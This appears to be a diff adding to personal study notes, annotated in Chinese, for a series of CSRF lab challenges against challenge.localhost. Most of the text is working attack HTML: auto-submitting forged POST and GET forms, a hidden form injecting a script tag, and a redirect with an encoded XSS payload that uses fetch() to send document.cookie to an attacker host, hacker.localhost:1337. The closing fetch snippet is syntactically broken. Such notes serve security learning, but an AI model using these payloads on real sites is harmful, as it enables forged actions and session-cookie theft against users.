@@ -209,3 +209,77 @@ csrf 1
     --这个方法的meta可以让信息不显示在页面
     --http-equiv="refresh" content="0; url=http://challenge.localhost/publish"
         --相互配合让页面刷新，并且0秒后跳转到指定的url
+
+
+
+
+CSRF 2
+  <!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>CSRF POST Attack</title>
+  </head>
+  <body>
+    <form id="csrfForm" action="http://challenge.localhost/publish" method="POST">
+    </form>
+
+    <script>
+      document.getElementById('csrfForm').submit();
+    </script>
+  </body>
+</html>
+ --<form id="csrfForm" action="http://challenge.localhost/publish" method="POST">
+        --html提交表单标准格式，内可以存放id，action，method等属性
+        --id用于后者的js调用，action为提交的地址，method为提交的方式
+--document.getElementById('csrfForm').submit(); 
+    --document.getElementById() 方法可返回对拥有指定 id 的第一个对象的引用。
+    --submit() 方法用于提交表单
+
+
+
+CSRF 3
+ <!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>CSRF + XSS Attack with Form Fix</title>
+  </head>
+  <body>
+    <form action="http://challenge.localhost/ephemeral" method="GET" style="display:none;">
+      <input type="hidden" name="msg" value="<script>alert('PWNED')</script>">
+      <input type="submit" value="Submit">
+    </form>
+
+    <script>
+      document.forms[0].submit(); 
+    </script>
+  </body>
+</html>
+
+
+CSRF 4
+      <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <title>XSS with Fetch for Cookie Theft</title>
+    </head>
+    <body>
+        <h</h1>
+
+        <script>
+    
+            window.location.href = "http://challenge.localhost/ephemeral?msg=<script>fetch('http%3A%2F%2Fhacker.localhost%3A1337%2F%3Fcookie%3D'+%2B+document.cookie)<%2Fscript>";
+        </script>
+    </body>
+    </html>
+
+    --此时的fetch()方法用于获取cookie，通过window.location.href = "http://challenge.localhost/ephemeral?msg=<script>fetch('http%3A%2F%2Fhacker.localhost%3A1337%2F%3Fcookie%3D'+%2B+document.cookie)<%2Fscript>";来获取cookie
+
+
+
+    fetch(http://challenge.localhost:80)
+    .then(response => response.text())
+    .then(data => console.log(data))
+    .then(fetch(http://hacker.localhost:1337/))
